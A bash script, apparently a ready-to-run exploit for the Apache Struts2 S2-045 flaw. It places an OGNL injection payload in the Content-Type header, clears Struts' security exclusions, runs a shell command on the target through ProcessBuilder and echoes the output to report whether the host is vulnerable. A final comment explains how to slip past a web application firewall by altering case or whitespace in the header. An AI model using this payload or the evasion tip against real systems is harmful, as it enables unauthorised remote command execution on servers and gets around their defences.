#!/usr/bin/env bash
TARGET="${1:?usage: bash s2045.sh http://TARGET:PORT [action路径]}"
ACT="${2:-/index.action}"
CMD='id'
HDR="%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='$CMD').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data"
printf '%s' "$HDR" > /tmp/s2045.hdr
out=$(curl -sS -m 15 "${TARGET%}/${ACT#/}" -H "@/tmp/s2045.hdr" 2>/dev/null)
printf '%s\n' "$out" | head -5
printf '%s' "$out" | grep -qE 'uid=[0-9]+' && echo "VULN  $TARGET" || echo "SAFE/未命中（404 时换真实 action 后缀）"
# WAF 拦时改 content-type 里的关键字大小写或加空白
